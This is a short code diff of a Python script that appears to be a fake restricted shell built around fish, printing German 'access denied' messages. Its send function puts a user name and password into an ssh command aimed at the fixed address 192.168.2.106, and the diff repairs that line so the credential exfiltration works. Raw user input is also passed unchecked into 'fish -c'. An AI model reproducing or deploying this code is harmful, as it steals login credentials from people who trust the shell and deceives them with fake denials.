@@ -23,7 +23,7 @@ binshells = [f"/bin/{shell}" for shell in shells] + [f"/usr/bin/{shell}" for she
 
 def send(User, Password):
     os.chdir(os.getenv('PWD'))
-    os.system(f('ssh "{User}:{Password}"@192.168.2.106'))
+    os.system(f'ssh "{User}:{Password}"@192.168.2.106')
     
     
 
@@ -56,6 +56,8 @@ while Input!="exit":
             print(f"fish: /bin/{split[0]}: Zugriff verweigert")
         elif split[0] in binshells:
             print(f"fish: {split[0]}: Zugriff verweigert")
+        elif 'fresh' in Input:
+            print(f'{split[0]}: {Input[len(split[0])+1:]}: Zugriff verweigert')
         else:
             os.system(f'fish -c "{Input}"')
     except:
